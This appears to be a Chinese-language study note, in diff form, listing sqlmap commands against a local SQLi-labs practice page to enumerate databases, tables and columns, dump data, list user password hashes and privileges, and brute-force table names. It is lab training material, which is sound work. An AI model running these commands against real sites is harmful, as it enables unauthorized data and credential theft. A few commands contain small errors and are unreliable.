@@ -1,0 +1,113 @@
+本机IP 192.168.189.1
+
+一. sqlmap检索DBMS信息
+1. sqlmap检索DBMS banner 获取后端数据库banner信息 参数 --banner或者-b
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --banner
+
+2. sqlmap检索DBMS当前数据库 获取当前数据库名 参数 --current-db
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --current-db
+得到结果为'security'
+
+全部按照默认选项
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --current-db --batch
+文件路径为: C:\Users\shelleyfu\AppData\Local\sqlmap\output\127.0.0.1
+
+3. sqlmap检索DBMS当前主机名
+获取主机名 参数 --hostname
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --hostname
+
+二. sqlmap检索DBMS用户信息
+1.sqlmap探测当前用DBA
+探测当前用户是否是数据库管理员 参数 --is-dba
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --is-dba
+
+2.sqlmap枚举DBMS用户密码
+Sqlmap会先列举用户，再列举用户密码Hash值。如果密码不是哈希值，则不能识别 参数 --passwords
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --password
+
+3. sqlmap枚举DBMS用户
+获取DBMS所有用户 参数 --users
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --users
+
+4. sqlmap枚举DBMS权限 参数：--privileges
+当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。
+若想只枚举特定用户的权限使用参数"-U"指定用户，可用"CU"来代表当前用户。
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --privileges -U root
+
+三. sqlmap枚举信息
+1. sqlmap列举数据库名
+列举数据库名称 参数 --dbs
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs
+
+2. sqlmap枚举数据库表
+列举数据库表名 参数:--tables   -D 数据库名字(指定具体数据库)
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --tables
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security --tables
+
+3. sqlmap枚举数据表列 参数 -- columns
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security --tables --columns
+只查询某一个表
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T user --columns
+
+4. sqlmap枚举数据值  参数 --dump
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T user --columns --dump
+
+5. sqlmap枚举schema信息 参数 --schema
+用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器 和他们各自的类型。 同样地，可使用参数--exclude-sysdbs排除系统数据库。
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --schema
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --schema --exclude-sysdbs
+
+6. sqlmap检索数据表数量
+如果用户只想知道表的条目数,则可以使用此参数 --count
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --count -D security
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --columns dump
+
+7. sqlmap获取数据信息  参数 --start --stop
+--start 1 --stop 3 返回当前数据库表的前三条记录
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security --tables --start 1 --stop 3
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --start 1 --stop 3
+
+8. sqlmap设置条件获取信息  参数 --where
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --where='id>2' --dump
+
+四.sqlmap暴力破解数据
+1. 暴力破解表名  参数 --common-tables
+    有些情况下用--tables不能列出数据库中表名来比如:
+    1.版本小于5.0的MySQL没有information_schema表
+    2.数据库用户权限过低无法读取表名
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --common-tables
+
+2. sqlmap暴力破解数据  暴力破解列名 参数 --common-columns
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --common-tables
+
+3. sqlmap检索所有信息
+返回所有的检索信息 参数 -a 或者--all
+python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -a
+
+练习靶场：https://www.mozhe.cn/bug/d1hJazFDeGRHV05DVjI3YXpHREZGUT09bW96aGUmozhe
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
